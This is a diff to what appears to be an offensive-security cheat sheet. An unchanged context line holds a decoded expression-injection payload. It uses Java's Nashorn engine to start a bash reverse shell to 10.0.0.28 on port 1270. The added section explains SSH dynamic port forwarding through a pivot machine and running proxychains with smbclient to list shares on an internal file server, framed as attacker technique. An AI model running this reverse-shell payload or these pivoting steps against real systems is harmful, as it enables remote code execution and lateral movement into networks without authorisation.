@@ -293,4 +293,16 @@ Decoded:
 ${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}
 ```
 
+ ## SSH Dynamic Port Forwarding:
  
+ Forwards one local port to multiple remote hosts; it is useful for accessing multiple systems.
+ 
+ ```
+ $ ssh -D 9000 RoseSecurity@pivot.machine
+ ```
+ 
+ Now, an attacker could utilize a SOCKS proxy or proxychains to access the systems.
+ 
+ ```
+ $ proxychains smbclient -L fileserver22
+ ```
